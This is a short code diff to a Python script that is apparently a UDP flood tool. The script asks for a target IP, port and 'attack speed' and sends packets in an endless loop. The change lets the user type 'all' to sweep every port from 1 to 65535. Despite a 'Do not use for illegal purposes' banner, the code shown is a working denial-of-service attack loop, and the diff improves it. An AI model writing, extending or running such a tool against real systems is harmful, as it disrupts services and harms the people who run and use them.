@@ -31,13 +31,13 @@ print (" ")
 print (" -----------------[Do not use for illegal purposes]----------------- ")
 print (" ")
 ip = input("Please input IP     : ")
-port = int(input("Please input Port ,if you want to attack each port, please enter 00000      : "))
+port = str(input("Please input Port ,if you want to attack each port, please enter all      : "))
 speed = int(input("attack speed (0-1000) : "))
 
 os.system("clear")
 
 sent = 0
-if port == 00000:
+if port == "all":
      port = 1     
      while True:
           sock.sendto(bytes, (ip,port))
@@ -48,6 +48,7 @@ if port == 00000:
           if port == 65535:
                port = 1
 else:
+     port = int(port)
      while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
